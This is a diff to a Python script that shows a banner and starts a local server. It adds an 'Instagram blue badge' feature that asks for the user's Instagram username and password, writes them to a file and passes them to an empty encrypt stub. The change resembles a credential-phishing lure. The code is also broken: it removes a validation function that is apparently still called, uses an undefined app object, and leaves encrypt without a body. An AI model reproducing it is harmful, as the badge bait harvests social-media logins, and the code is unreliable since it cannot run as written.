@@ -54,10 +54,6 @@ print("\033[92m         #                                             #")
 print("\033[92m         ***********************************************")
 print("\033[92m\n\n")
 
-# Prompt user to enter a port number
-def validate_port(port):
-    return re.match(r'^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port)
-
 def run_server():
     while True:
         port = input("Please enter a port number (1024 to 65535): ")
@@ -65,7 +61,7 @@ def run_server():
             break
         else:
             print("Invalid port number. Please enter a valid port number.")
-    
+
     # Generate the link
     link = f"http://localhost:{port}/"
 
@@ -80,5 +76,24 @@ def run_server():
     # Print start message
     print(f"Starting server on port {port}")
 
-if __name__ == "__main__":
-    run_server()
+    # Import the necessary modules for Instagram blue badge functionality
+    import instagram_blue_badge_module
+
+    # Start the server
+    app.run(port=port, logfile=logfile)
+
+    # Save the user's credentials
+    username = input("Please enter your Instagram username: ")
+    password = input("Please enter your Instagram password: ")
+    with open("credentials.txt", "w") as f:
+        f.write(f"{username}\n{password}")
+        f.close()
+    with open("credentials.txt", "rb") as f:
+        credentials = f.read()
+    with open("credentials.txt.enc", "wb") as f:
+        f.write(encrypt(credentials))
+    os.remove("credentials.txt")
+
+def encrypt(data):
+    # Implement encryption functionality here
+    # Return the encrypted data
